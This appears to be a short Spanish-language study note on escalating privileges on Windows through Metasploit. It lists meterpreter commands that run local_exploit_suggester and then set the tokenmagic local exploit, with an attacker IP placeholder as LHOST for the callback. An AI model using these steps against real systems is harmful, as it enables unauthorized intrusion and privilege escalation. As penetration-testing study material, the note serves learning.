
---

- Para poder escalar privilegios de este modo lo mas aconsejable es vulnerar el sistema con una sesión de meterpreter como aparece en [[Metasploit]]

```bash
meterpreter >
				background        # poner la sesion en 2 plano 
				search local_exploit_suggester    # Buscar el modulo de escalada de privilegios
				use 0                             # Usar el modulo 
				show options
				sessions -l                       # Buscar las sesiones que tenemos activas
				set SESSION 1                     # Seteamos la sesion que habiamos dejado en 2 plano con su ID
				run
```

- Aqui nos aparecerán muchas formas de escalar privilegios, de las cuales probaremos una a una de las que están en verdes hasta que funcionen:

![[Pasted image 20251022195026.png]]

- Haremos lo siguiente:

```bash
use exploit/windows/local/tokenmagic   # seteamos el exploit que queramos
show options 
set SESSION 1           # Seteamos el ID de la sesion que teniamos
set LHOST <IpAtacante>  # seteamos nuestra ip
set LPORT 5555          # Cambiamos el puerto a uno que no estemos usando para evitar problemas de compatibilidad
```

- Con `sessions -i <ID>` podemos volver a la sesión que ya teníamos abierta 